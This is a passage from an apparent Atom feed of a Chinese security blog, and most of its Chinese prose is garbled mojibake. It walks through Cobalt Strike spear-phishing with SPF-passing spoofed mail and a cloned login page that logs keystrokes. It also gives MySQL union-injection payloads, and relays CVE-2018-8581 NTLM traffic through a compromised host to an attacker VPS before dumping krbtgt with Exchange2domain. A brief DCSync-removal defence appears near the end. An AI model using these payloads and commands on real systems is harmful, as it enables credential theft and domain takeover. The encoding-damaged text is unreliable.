src="/usr/uploads/2019/15597241905750.jpg" alt="-w333"></p><p>å¦åˆ™å°±ä¸éœ€è¦åšä»€ä¹ˆåˆ«çš„ä¿®æ”¹ã€‚ä¹‹åï¼Œé…ç½®å¯¹åº”çš„<code>Mail server</code>ï¼Œå°±å¯ä»¥è¿›è¡Œå‘é€é‚®ä»¶äº†ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹,ä¸ºäº†ç»•è¿‡SPFçš„æ£€æŸ¥ï¼Œ<code>Bunce to</code>éœ€è®¾ç½®ä¸ºä¸<code>Mail server</code>åŒåŸŸï¼Œå¦‚<code>Mail server</code>ä¸º <code>mail.evi1cg.me</code>,<code>Bunce to</code>å¯è®¾ç½®ä¸º<a href="mailto:`admin@evi1cg.me" target="_blank" rel="noopener">`admin@evi1cg.me</a>`ã€‚</p><p>ä¹‹åç‚¹å‡»<code>Send</code>åˆ™å¯å‘é€é‚®ä»¶ï¼Œæ”¶åˆ°çš„é‚®ä»¶ä¸æ¨¡æ¿ä¸€è‡´ã€‚<br><img src="/usr/uploads/2019/15597245409452.jpg" alt="-w991"></p><p>å¦å¤–æŸ¥çœ‹SRFä¸º<code>PASS</code>çŠ¶æ€ï¼š</p><p><img src="/usr/uploads/2019/15597249761870.jpg" alt="-w1062"></p><p>å¦å¤–ï¼ŒCSä¹Ÿæœ‰å‘é€é™„ä»¶çš„åŠŸèƒ½ï¼Œä½†æ˜¯åŸç‰ˆæœ¬çš„CSå‘é€é™„ä»¶æœ‰ä¸€ä¸ªBugï¼Œå³å¦‚æœé™„ä»¶ä¸ºä¸­æ–‡åç§°ï¼Œåˆ™ä¼šåœ¨æœ€åçš„é‚®ä»¶ä¸­æ˜¾ç¤ºä¹±ç é™„ä»¶ï¼š<br><img src="/usr/uploads/2019/15597249044056.jpg" alt="-w1008"></p><p>æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦å¯¹CSåŠ¨åˆ€äº†ï¼Œç»è¿‡è°ƒè¯•ï¼ŒæˆåŠŸå®šä½åˆ°<code>mail\Eater.java</code>ï¼Œéœ€è¦å¯¹æ­¤ç±»ä¸­çš„<code>createAttachment</code>æ–¹æ³•è¿›è¡Œä¿®æ”¹ï¼š<br><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> BodyPart createAttachment(<span class="keyword">String</span> name) throws IOException &#123;</span><br><span class="line">   File file = <span class="keyword">new</span> <span class="type">File</span>(name);</span><br><span class="line">   <span class="keyword">String</span> namez = file.getName();</span><br><span class="line">   <span class="keyword">String</span> filename = <span class="keyword">new</span> <span class="type">String</span>(namez.getBytes(<span class="string">"utf-8"</span>),<span class="string">"ISO8859-1"</span>);</span><br><span class="line">   Body body = (<span class="keyword">new</span> <span class="type">StorageBodyFactory</span>()).binaryBody((InputStream)(<span class="keyword">new</span> <span class="type">FileInputStream</span>(name)));</span><br><span class="line">   Map temp = <span class="keyword">new</span> <span class="type">HashMap</span>();</span><br><span class="line">   temp.put(<span class="string">"name"</span>, filename);</span><br><span class="line">   BodyPart bodyPart = <span class="keyword">new</span> <span class="type">BodyPart</span>();</span><br><span class="line">   bodyPart.setBody(body, <span class="string">"application/octet-stream"</span>, temp);</span><br><span class="line">   bodyPart.setContentTransferEncoding(<span class="string">"base64"</span>);</span><br><span class="line">   bodyPart.setContentDisposition(<span class="string">"attachment"</span>);</span><br><span class="line">   bodyPart.setFilename(filename);</span><br><span class="line">   <span class="keyword">return</span> bodyPart;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·å°±å¯ä»¥è§£å†³é™„ä»¶ä¹±ç é—®é¢˜äº†:<br><img src="/usr/uploads/2019/15597252411387.jpg" alt="-w1005"></p><h2 id="0x02-Web-clone"><a href="#0x02-Web-clone" class="headerlink" title="0x02 Web clone"></a>0x02 Web clone</h2><p>å¦å¤–åœ¨è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªä¸Web Cloneç»“åˆçš„åœ°æ–¹ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬å…ˆCloneä¸€ä¸ªéœ€ç™»å½•çš„ç½‘ç«™ï¼Œå¦‚ç½‘æ˜“é‚®ç®±ï¼š<br><img src="/usr/uploads/2019/15597262318727.jpg" alt="-w409"></p><p>è¿™é‡Œå¯ä»¥é€‰æ‹©å¼€å¯é”®ç›˜è®°å½•åŠŸèƒ½ã€‚</p><p>å¼€å¯Cloneï¼š<br><img src="/usr/uploads/2019/15597263501598.jpg" alt="-w276"></p><p>è®¾ç½®spear phish:<br><img src="/usr/uploads/2019/15597264046957.jpg" alt="-w981"></p><p>Embed URLé€‰æ‹©åˆšåˆšå…‹éš†çš„urlï¼Œå‘é€é‚®ä»¶ï¼Œæ­¤æ—¶ç”¨æˆ·ç‚¹å‡»é‡ç½®æŒ‰é’®ï¼Œåˆ™ä¼šè·³è½¬åˆ°Cloneçš„ç«™ç‚¹ï¼š<br><img src="/usr/uploads/2019/mail.gif" alt="mai"></p><p>æ­¤æ—¶ï¼Œç”¨æˆ·è¾“å…¥ä¼šè¢«è®°å½•ï¼š</p><p><img src="/usr/uploads/2019/keylog.gif" alt="keylog"></p><p>emmm. å¤§æ¦‚å°±ä»‹ç»è¿™ä¹ˆå¤šå§ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/usr/uploads/2019/15597224054660.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="å·¥å…·æ”¶é›†" scheme="https://evi1cg.github.io/categories/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
    
      <category term="phishing" scheme="https://evi1cg.github.io/tags/phishing/"/>
    
  </entry>
  
  <entry>
    <title>ä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹æ³¨å…¥</title>
    <link href="https://evi1cg.github.io/archives/sqli_without_knowing_columns_names.html"/>
    <id>https://evi1cg.github.io/archives/sqli_without_knowing_columns_names.html</id>
    <published>2019-02-13T07:26:29.000Z</published>
    <updated>2019-02-13T08:15:32.095Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/usr/uploads/2019/15500455788558.jpg" alt="-w1225"></p><a id="more"></a><h2 id="0x00-ç®€ä»‹"><a href="#0x00-ç®€ä»‹" class="headerlink" title="0x00 ç®€ä»‹"></a>0x00 ç®€ä»‹</h2><p>åœ¨ mysql =&gt; 5 çš„ç‰ˆæœ¬ä¸­å­˜åœ¨åº“<code>information_schema</code>,è®°å½•ç€mysqlä¸­æ‰€æœ‰è¡¨çš„ç»“æ„ï¼Œé€šå¸¸ï¼Œåœ¨mysql sqliä¸­ï¼Œæˆ‘ä»¬ä¼šé€šè¿‡æ­¤åº“ä¸­çš„è¡¨å»è·å–å…¶ä»–è¡¨çš„ç»“æ„ï¼Œå³è¡¨åï¼Œåˆ—åç­‰ã€‚ä½†æ˜¯è¿™ä¸ªåº“ä¹Ÿä¼šç»å¸¸è¢«WAFè¿‡æ»¤ã€‚å½“æˆ‘ä»¬é€šè¿‡æš´åŠ›ç ´è§£è·å–åˆ°è¡¨ååï¼Œè¯¥å¦‚ä½•è¿›è¡Œä¸‹ä¸€æ­¥åˆ©ç”¨å‘¢ï¼Ÿ</p><blockquote><p>åœ¨information_schemaä¸­ï¼Œé™¤äº†SCHEMATAï¼ŒTABLESï¼ŒCOLUMNSæœ‰è¡¨ä¿¡æ¯å¤–ï¼Œé«˜ç‰ˆæœ¬çš„mysqlä¸­ï¼Œè¿˜æœ‰INNODB_TABLESåŠINNODB_COLUMNSä¸­è®°å½•ç€è¡¨ç»“æ„ã€‚</p></blockquote><h2 id="0x01-ä¸ä½¿ç”¨è¡¨åæŸ¥è¯¢"><a href="#0x01-ä¸ä½¿ç”¨è¡¨åæŸ¥è¯¢" class="headerlink" title="0x01 ä¸ä½¿ç”¨è¡¨åæŸ¥è¯¢"></a>0x01 ä¸ä½¿ç”¨è¡¨åæŸ¥è¯¢</h2><p>æ­£å¸¸çš„æŸ¥è¯¢å¦‚ä¸‹ï¼š<br><img src="/usr/uploads/2019/15500437457634.jpg" alt="-w489"></p><p>å…¶ä¸­ï¼Œåˆ—åä¸º<code>id</code>,<code>name</code>,<code>pass</code>,<code>mail</code>,<code>phone</code>ï¼Œä½¿ç”¨unionæŸ¥è¯¢<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500439319694.jpg" alt="-w502"></p><p>æ¥ç€ï¼Œå°±å¯ä»¥ç»§ç»­ä½¿ç”¨æ•°å­—æ¥å¯¹åº”åˆ—,å¦‚3å¯¹åº”äº†è¡¨é‡Œé¢çš„pass:<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`3`</span> from (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>)<span class="title">a</span>;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500441801262.jpg" alt="-w640"></p><p>å½“  ` ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b from (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>)<span class="title">a</span>;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500450275510.jpg" alt="-w713"></p><p>åœ¨æ³¨å…¥ä¸­æŸ¥è¯¢å¤šä¸ªåˆ—ï¼š<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(<span class="string">`2`</span>,<span class="number">0x3a</span>,<span class="string">`3`</span>) from (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>)<span class="title">a</span> <span class="title">limit</span> 1,1;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500443786658.jpg" alt="-w808"></p><p>FROM:<a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">Extracting data without knowing columns names </a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/usr/uploads/2019/15500455788558.jpg&quot; alt=&quot;-w1225&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="å¥‡æŠ€æ·«å·§" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="Sqli" scheme="https://evi1cg.github.io/tags/Sqli/"/>
    
  </entry>
  
  <entry>
    <title>Remote NTLM relaying through CS</title>
    <link href="https://evi1cg.github.io/archives/Remote_NTLM_relaying_through_CS.html"/>
    <id>https://evi1cg.github.io/archives/Remote_NTLM_relaying_through_CS.html</id>
    <published>2019-01-26T19:49:33.000Z</published>
    <updated>2019-01-28T05:07:17.762Z</updated>
    
    <content type="html"><![CDATA[<p> <img src="/usr/uploads/2019/15485575598334.jpg" alt="-w944"></p><a id="more"></a><h2 id="0x00-ä¸ºä»€ä¹ˆå†™è¿™ä¸ªï¼Ÿ"><a href="#0x00-ä¸ºä»€ä¹ˆå†™è¿™ä¸ªï¼Ÿ" class="headerlink" title="0x00 ä¸ºä»€ä¹ˆå†™è¿™ä¸ªï¼Ÿ"></a>0x00 ä¸ºä»€ä¹ˆå†™è¿™ä¸ªï¼Ÿ</h2><p>æœ€è¿‘åœ¨å­¦ä¹ Exchangeåœ¨ææƒä¸­çš„åº”ç”¨çš„æ—¶å€™ï¼Œç¢°åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå³ï¼šå¦‚æœæˆ‘ä»¬ç°åœ¨æ‹¥æœ‰äº†ä¸€ä¸ªå†…ç½‘çš„windowsä¸»æœºï¼Œå¦‚ä½•åˆ©ç”¨è¿™å°ä¸»æœºä½¿ç”¨<a href="https://evi1cg.me/archives/Exchange_Privilege_Elevation.html" target="_blank" rel="noopener">CVE_2018_8581</a> ï¼Ÿå¤§æ¦‚çš„ç»“æ„æ˜¯è¿™æ ·ï¼š</p><p> <img src="/usr/uploads/2019/15485584490614.jpg" alt="-w944"></p><blockquote><p>æ”»å‡»è€…é€šè¿‡æŸç§æ–¹å¼è·å–ä¸€å°åŸŸå†…ä¸»æœºæƒé™ã€‚å¹¶è·å–äº†æ­¤ä¸»æœºçš„åŸŸæˆå‘˜è´¦å·å¯†ç ï¼Œåœ¨è·å–DCåŠExchange Serverçš„ipåœ°å€åï¼Œåˆ©ç”¨CVE_2018_8581</p></blockquote><h2 id="0x01-åˆ©ç”¨æ€è·¯"><a href="#0x01-åˆ©ç”¨æ€è·¯" class="headerlink" title="0x01 åˆ©ç”¨æ€è·¯"></a>0x01 åˆ©ç”¨æ€è·¯</h2><h3 id="æ€è·¯ä¸€ï¼šç¼–è¯‘pyç‰ˆçš„impacket"><a href="#æ€è·¯ä¸€ï¼šç¼–è¯‘pyç‰ˆçš„impacket" class="headerlink" title="æ€è·¯ä¸€ï¼šç¼–è¯‘pyç‰ˆçš„impacket"></a>æ€è·¯ä¸€ï¼šç¼–è¯‘pyç‰ˆçš„impacket</h3><p>åœ¨åšè¿™ä¸ªçš„æ—¶å€™ï¼Œç¬¬ä¸€æƒ³æ³•å°±æ˜¯æœ‰æ²¡æœ‰windowsä¸‹å¯ç”¨çš„impacketï¼Œåæ¥æ‰¾äº†æ‰¾ï¼Œè¿˜çœŸæœ‰<a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">impacket_static_binaries</a>ï¼Œäºæ˜¯å°±æ‹¿æ¥ç”¨äº†ã€‚ä½†æ˜¯åæ¥å‘ç°æ˜¯æœ‰é—®é¢˜çš„ã€‚<br><del>é¦–å…ˆï¼Œåˆ©ç”¨éœ€è¦å…³é—­winçš„445ç«¯å£ï¼Œè¿™ä¸ªå°±éœ€è¦é‡å¯ï¼Œè¿™æ˜¯æˆ‘ä»¬éå¸¸ä¸æ„¿æ„åšçš„ï¼Œå¦å¤–ï¼Œä¼¼ä¹</del>winç‰ˆçš„<code>ntlmrelayx</code> å’Œ <code>smbrelayx</code>è¿˜ä¸èƒ½ç”¨ã€‚</p><p><img src="/usr/uploads/2019/15485595933128.jpg" alt="-w932"></p><p>æ‰€ä»¥ç›´æ¥æ”¾å¼ƒäº†ã€‚</p><h3 id="æ€è·¯äºŒï¼šé€šè¿‡meterpreterè¿›è¡ŒNTLM-relaying"><a href="#æ€è·¯äºŒï¼šé€šè¿‡meterpreterè¿›è¡ŒNTLM-relaying" class="headerlink" title="æ€è·¯äºŒï¼šé€šè¿‡meterpreterè¿›è¡ŒNTLM relaying"></a>æ€è·¯äºŒï¼šé€šè¿‡meterpreterè¿›è¡ŒNTLM relaying</h3><p>è¿™ä¸ªæ€è·¯æ˜¯ä¹‹å‰çœ‹åˆ°çš„<a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">ã€ŠRemote NTLM relaying through meterpreter on Windows port 445ã€‹</a>æ¥çš„ã€‚åœ¨è¿™ç¯‡æ–‡ç« é‡Œé¢ï¼Œè¯¦ç»†åˆ†æäº†æ˜¯è°å ç”¨äº†445ï¼Œå¦‚ä½•è¿›è¡Œè½¬å‘å†è¿›è¡ŒRemote NTLM relayingã€‚åˆ©ç”¨<code>CVE_2018_8581</code>ï¼Œæˆ‘ä»¬éœ€è¦<del>ä¸¤ä¸ªç«¯å£ï¼Œ<code>445</code>å’Œ</del><code>80</code>(80å¯ä»¥æ˜¯å…¶ä»–ç«¯å£ï¼Œç”¨æ¥å¼€å¯HTTPæœåŠ¡)ï¼Œä½†æ˜¯å®é™…æµ‹è¯•çš„æ—¶å€™ï¼Œå¹¶ä¸é¡ºåˆ©ï¼ŒæˆåŠŸæ·»åŠ è·¯ç”±ï¼Œå¼€å¯ç«¯å£è½¬å‘ï¼Œå¼€å¯ socks4a ä¹‹åï¼Œæœ¬åœ°é€šè¿‡proxychainså¼€å¯ä¸€ä¸ªweb serverï¼Œåœ¨å†…ç½‘å…¶ä»–ä¸»æœºè¯·æ±‚è¿™ä¸ªserverçš„æ—¶å€™ï¼Œå¹¶æœªçœ‹åˆ°ä»»ä½•è¯·æ±‚ï¼ˆå¯èƒ½æ˜¯å§¿åŠ¿ä¸å¯¹ï¼ŒæˆåŠŸçš„å¸ˆå‚…è¿˜æœ›ä¸åèµæ•™ï¼‰ã€‚æ‰€ä»¥é€šè¿‡æ­¤æ–¹å¼ï¼Œä¹Ÿå¹¶æ²¡è¾¾åˆ°æˆ‘æœŸæœ›çš„æ•ˆæœã€‚</p><h3 id="æ€è·¯ä¸‰ï¼šé€šè¿‡CSéƒ¨ç½²VPN"><a href="#æ€è·¯ä¸‰ï¼šé€šè¿‡CSéƒ¨ç½²VPN" class="headerlink" title="æ€è·¯ä¸‰ï¼šé€šè¿‡CSéƒ¨ç½²VPN"></a>æ€è·¯ä¸‰ï¼šé€šè¿‡CSéƒ¨ç½²VPN</h3><p>è¿™ä¸ªä¹Ÿæ˜¯æˆ‘è§‰å¾—æœ€ç®€å•çš„ä¸€ç§æ–¹å¼ï¼Œåœ¨ä¸Šé¢ä¸¤ç§æ€è·¯å¤±è´¥ä¹‹åï¼Œå°±åªèƒ½æœŸå¾…è¯•ç”¨è¿™ç§æ–¹å¼æ¥è¿›è¡Œäº†ï¼Œè¿˜å¥½ï¼ŒæˆåŠŸå•¦~</p><p>Cobaltstrike çš„covertvpnçš„ä»‹ç»ï¼Œå¯ä»¥çœ‹<a href="https://www.cobaltstrike.com/help-covert-vpn" target="_blank" rel="noopener">è¿™é‡Œ</a>ã€‚</p><p>åœ¨è·å–åˆ°ä¸€ä¸ªBeconä¹‹å,å³é”®è¿æ¥-&gt;Pivoting-&gt;Deploy VPN</p><p><img src="/usr/uploads/2019/15485609930800.jpg" alt="-w749"></p><p>ä¹‹åï¼Œé€‰æ‹©å¯¹åº”çš„å†…ç½‘ip</p><p><img src="/usr/uploads/2019/15485610686816.jpg" alt="-w480"></p><p>ç‚¹å‡»ADDæ¥æ·»åŠ æœ¬åœ°ç½‘å£ï¼š</p><p><img src="/usr/uploads/2019/15485611318865.jpg" alt="-w392"></p><p>åœ¨è¿™é‡Œæœ‰å¤šç§æ–¹å¼çš„éš§é“ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦é€‰æ‹©ï¼Œé»˜è®¤UDPæ˜¯å¼€é”€æœ€å°çš„ä¸€ç§æ–¹å¼ã€‚æ·»åŠ ä»¥åï¼Œç‚¹å‡»Deployåˆ™å¯éƒ¨ç½²æˆåŠŸã€‚</p><p><img src="/usr/uploads/2019/15485612387475.jpg" alt="-w480"></p><p>ä¹‹åï¼Œåœ¨<code>Interfaces</code>ä¸­å¯ä»¥çœ‹åˆ°å¯¹åº”ä¿¡æ¯ï¼š</p><p><img src="/usr/uploads/2019/15485613085983.jpg" alt="-w748"></p><p>ä¹‹åæˆ‘ä»¬åœ¨VPSä¸Šé…ç½®æ­¤ç½‘å£ï¼š<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig<span class="built_in"> Interface </span>CIDR</span><br></pre></td></tr></table></figure></p><p>example:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig phear5 <span class="number">10.211</span><span class="number">.55</span><span class="number">.225</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure></p><blockquote><p>å‰é¢çš„ipåœ°å€å°±æ˜¯è¦ç»™æˆ‘ä»¬çš„ç½‘å£é…ç½®çš„ipåœ°å€ï¼Œç›¸å½“äºåœ¨åŸŸé‡Œé¢æ–°æ¥å…¥äº†ä¸€å°ä¸»æœº</p></blockquote><p>ä¹‹åï¼Œå°±å¯ä»¥ä¸å†…ç½‘ä¸»æœºè¿›è¡Œé€šä¿¡äº†ã€‚</p><p>è¿™ç§æ–¹å¼æˆ‘å½•äº†ä¸€ä¸ªDemoï¼š</p><div class="video-container"><iframe src="//www.youtube.com/embed/isy-QjJykss" frameborder="0" allowfullscreen></iframe></div><blockquote><p>Tipsï¼šéƒ¨ç½²VPNåªéœ€è¦æ™®é€šç”¨æˆ·æƒé™å³å¯ã€‚ä½†æ˜¯è·å–å½“å‰ç”¨æˆ·è´¦å·å¯†ç éœ€è¦ææƒã€‚</p></blockquote><h2 id="0x02-å¦‚ä½•é˜²å¾¡-CVE-2018-8581"><a href="#0x02-å¦‚ä½•é˜²å¾¡-CVE-2018-8581" class="headerlink" title="0x02 å¦‚ä½•é˜²å¾¡ CVE_2018_8581"></a>0x02 å¦‚ä½•é˜²å¾¡ CVE_2018_8581</h2><p>åˆ é™¤åŸŸå†…æŸç”¨æˆ·çš„<code>DCSync</code>æƒé™ï¼Œå¯ä½¿ç”¨ <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">PowerView</a>ã€‚</p><p>å…·ä½“å‘½ä»¤ä¸ºï¼š<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetIdentity <span class="string">"DC=cgdomain,DC=com"</span> -PrincipalIdentity<span class="built_in"> user </span>-Rights DCSync</span><br></pre></td></tr></table></figure></p><blockquote><p>æ ¹æ®è‡ªå·±çš„å®é™…ç¯å¢ƒè¿›è¡Œä¿®æ”¹</p></blockquote><p>ä¿®å¤Exchageæƒé™ï¼Œå¯ä½¿ç”¨ <a href="https://raw.githubusercontent.com/gdedrouas/Exchange-AD-Privesc/master/DomainObject/Fix-DomainObjectDACL.ps1" target="_blank" rel="noopener">Fix-DomainObjectDACL.ps1</a></p><p>å…·ä½“å‘½ä»¤ä¸ºï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\Fix-DomainObjectDACL<span class="selector-class">.ps1</span> -Fix</span><br></pre></td></tr></table></figure><h2 id="0x03-è¿›ä¸€æ­¥æµ‹è¯•"><a href="#0x03-è¿›ä¸€æ­¥æµ‹è¯•" class="headerlink" title="0x03 è¿›ä¸€æ­¥æµ‹è¯•"></a>0x03 è¿›ä¸€æ­¥æµ‹è¯•</h2><p>ç»è¿‡è¿›ä¸€æ­¥æµ‹è¯•ä»¥åŠå¯¹æ¼æ´çš„åŸç†å†æ¬¡å­¦ä¹ ï¼Œå‘ç°å…¶å®æˆ‘ä»¬åªéœ€è¦å¼€å¯ä¸€ä¸ªwebæœåŠ¡å³å¯ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥ä½¿ç”¨ä»»æ„ç«¯å£(åœ¨impacketä¸­ï¼ŒHTTPRelayServeré»˜è®¤ç«¯å£ä¸º80ï¼Œ<a href="https://github.com/Ridter/Exchange2domain" target="_blank" rel="noopener">Exchange2domain</a>å·²æ”¯æŒè‡ªå®šä¹‰ç«¯å£)ã€‚</p><p>å½“ç„¶ï¼Œä¸Šè¿° <strong>æ€è·¯ä¸‰</strong> å¯¹smbrelayä¹Ÿæ˜¯éå¸¸å¥½ç”¨çš„ä¸€ç§æ–¹å¼ã€‚ç°åœ¨è¡¥å……ä¸€ä¸‹ <strong>æ€è·¯äºŒ</strong> çš„å…·ä½“åˆ©ç”¨æ–¹æ³•ã€‚</p><p>ç”±äºæˆ‘ä»¬ä¸éœ€è¦smb Serverï¼Œæ‰€ä»¥ä¹Ÿä¸éœ€è¦å‘<a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">ã€ŠRemote NTLM relaying through meterpreter on Windows port 445ã€‹</a>ä¸­æ‰€è¿°å¯¹445ç«¯å£è¿›è¡Œè½¬å‘ï¼Œæˆ‘ä»¬åªéœ€è¦å°†webç«¯å£è½¬å‘å‡ºæ¥å³å¯ã€‚åœ¨è·å–ä¸€ä¸ªmeterpreterä¼šè¯ä¹‹åï¼Œæ·»åŠ è·¯ç”±:<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="keyword">run</span><span class="bash"> post/multi/manage/autoroute</span></span><br></pre></td></tr></table></figure></p><p>ä¹‹åå¼€å¯<code>socks4a</code>ä»£ç†ã€‚</p><p><img src="/usr/uploads/2019/15486510674349.jpg" alt="-w1006"></p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°msfçš„<code>portfwd</code>ä¸æ€ä¹ˆç¨³å®šï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©äº†ä½¿ç”¨<a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener"><code>ew</code></a>ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨lcxç­‰å…¶ä»–è½¬å‘å·¥å…·ã€‚<br>åœ¨vpsä¸Šå¼€å¯è½¬å‘ï¼š<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â˜  lcx  ./ew -s lcx_tran -l <span class="number">8088</span> -f <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -g <span class="number">8044</span></span><br></pre></td></tr></table></figure></p><blockquote><p>ç›‘å¬æœ¬åœ°8088ç«¯å£ï¼Œå¹¶å°†æ•°æ®è½¬å‘åˆ°127.0.0.1çš„8044ç«¯å£</p></blockquote><p>ç„¶ååœ¨æˆ‘ä»¬æœ‰æƒé™çš„ä¸»æœºä¸Šæ‰§è¡Œï¼š<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>anfeng<span class="symbol">\D</span>esktop&gt;ew_for_Win.exe -s lcx_tran -l 8044 -f 103.*.*.* -g 8088</span><br></pre></td></tr></table></figure></p><blockquote><p>ç›‘å¬æœ¬åœ°8044ç«¯å£çš„æ•°æ®ï¼Œå¹¶å°†æ•°æ®è½¬å‘åˆ°103.<em>.</em>.*çš„8080ç«¯å£ã€‚<code>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰æƒé™çš„ä¸»æœºç›‘å¬ç«¯å£=vpsè½¬å‘ç«¯å£=Exchange2domainç›‘å¬ç«¯å£</code></p></blockquote><p>ä¹‹åï¼Œåœ¨vpsä¸Šé…ç½®proxychainsï¼Œubuntuä¸Šproxychainsçš„é…ç½®æ–‡ä»¶è·¯å¾„ä¸º<code>/etc/proxychains.conf</code>ã€‚ä¿®æ”¹ä»£ç†é…ç½®æ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="meta"># add proxy here ...</span></span><br><span class="line"><span class="meta"># meanwile</span></span><br><span class="line"><span class="meta"># defaults set to "tor"</span></span><br><span class="line">socks4  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br></pre></td></tr></table></figure></p><p>ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä¸€æ‰§è¡ŒExchange2domainäº†ï¼š<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python Exchange2domain.py -ah proxyip -ap 8044 -u<span class="built_in"> user </span>-p password -d domain -th DCIP ExchangeIP --just-dc-user krbtgt</span><br></pre></td></tr></table></figure></p><blockquote><p>æ³¨æ„ç›‘å¬ç«¯å£è·Ÿä¸Šé¢ä¸€è‡´ï¼Œproxyipä¸ºæˆ‘ä»¬æœ‰æƒé™çš„ä¸»æœºçš„ipåœ°å€ã€‚</p></blockquote><p>æ‰€ä»¥ï¼Œæ•´ä¸ªæ”»å‡»è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><img src="/usr/uploads/2019/15486518696316.jpg" 